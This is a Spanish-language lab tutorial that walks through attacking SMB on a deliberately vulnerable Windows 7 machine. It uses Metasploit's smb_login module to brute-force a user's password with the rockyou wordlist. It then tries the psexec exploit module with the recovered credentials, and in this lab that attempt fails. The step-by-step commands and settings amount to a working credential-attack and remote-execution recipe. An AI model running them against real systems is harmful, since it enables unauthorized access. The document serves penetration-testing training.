# Enumeración y Explotación Básica del Protocolo SMB con Metasploit

Maquina que vamos a utilizar **Kali Linux y Windows 7 vulnerable** ([https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing](https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing))

Realizaremos un ataque al protocolo SMB utilizando metasploit, donde podremos utilizar un diccionario para probar a una alta velocidad si encuentra la contraseña para acceder a este protocolo y enumerar los recursos compartidos en el sistema.

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%209.png)

- Abrimos el Metasploit.
    
    Tenemos que entender que el Metasploit no solo sirve para explotar vulnerabilidades **también podemos utilizarlo para ataques de fuerza bruta, iniciar sesión mediante SSH , SMB, Pivoting, etc**…
    
    ![image.png](./imagenes/image%2010.png)
    
- Haremos un ataque de fuerza bruta al protocolo SMB. Usaremos un modulo llamado
    - `use auxiliary/scanner/smb/smb_login`
        
        ![image.png](./imagenes/image%2011.png)
        
    - `show options`
        
        ![image.png](./imagenes/image%2012.png)
        
    
    - `set RHOST 10.0.3.6`
    - `set VERBOSE false` . Hacemos esto para que no muestre la información del ataque hasta que terminé , con esto logramos que vaya mas rápido el ataque.
    - `set SMBUser mario` . Vamos a suponer que se el usuario pero no la contraseña.
    - `set PASS_FILE /usr/share/wordlists/rockyou.txt` . Cargamos el diccionario .
        
        ![image.png](./imagenes/image%2013.png)
        
    
    - `show options`
        
        ![image.png](./imagenes/image%2014.png)
        
    
    - `run`
        
        ![image.png](./imagenes/image%2015.png)
        

- Una vez que tenemos un usuario y una contraseña hay que intentar **iniciar sesión median PsExec** que dependerá si la maquina victima lo tiene habilitado o no. Usaremos el modulo `exploit/windows/smb/psexec`
    
    <aside>
    💡
    
    **PsExec** implica ejecutar comandos o procesos en un sistema remoto desde tu máquina local. PsExec es una herramienta de Sysinternals desarrollada por Microsoft que permite la administración remota sin necesidad de instalar software adicional en el sistema remoto.
    
    </aside>
    

- `use exploit/windows/smb/psexec`
- `show options`
    
    ![image.png](./imagenes/image%2016.png)
    

- `set RHOSTS 10.0.3.6`
- `set SMBPass 123123`
- `set SMBUser mario`
- `show options`
    
    ![image.png](./imagenes/image%2017.png)
    
    Hay que verificar que los siguientes datos estén bien.
    
    ![image.png](./imagenes/image%2018.png)
    

- `run`
    
    ![image.png](./imagenes/image%2019.png)
    
    Vemos que no funciona en este caso pero es importante probarlo.